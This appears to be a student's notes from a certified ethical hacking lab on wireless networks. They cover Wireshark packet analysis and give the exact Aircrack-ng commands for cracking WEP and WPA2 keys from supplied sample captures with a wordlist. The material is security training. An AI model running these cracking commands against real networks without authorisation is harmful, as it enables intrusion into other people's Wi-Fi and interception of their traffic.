Module 16: Hacking Wireless Networks



PS: In wireless networks, communication takes place through radio wave transmission, which usually takes place at the physical layer of the network structure.



1. Perform wireless traffic analysis


a. Wi-Fi packet analysis using Wireshark

PS: In real time, attackers enforce packet capture and packet filtering techniques to capture packets containing passwords (only for websites implemented on HTTP channel), perform attacks such as session hijacking, and so on.






2. Perform wireless attacks

a. Crack a WEP network using Aircrack-ng

PS: Aircrack-ng is a network software suite consisting of a detector, packet sniffer, WEP, and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless networks.

PS: The program runs on both Linux and Windows

Step 1: Copy the Capture Folder and Wordlist and Paste on Desktop

Places -> Desktop -> CEHv12 Module 16 ..-> Sample Capture and Wordlist -> Paste on desktop


Step 2: Crack the WEP Key

$ sudo su
$ aircrack-ng '/home/attacker/Desktop/Sample Capture/WEPcrack-01.cap'




b. Crack a WPA2 network using Aircrack-ng

$ aircrack-ng -a2 -b 20:E5:2A:E4:38:00 -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
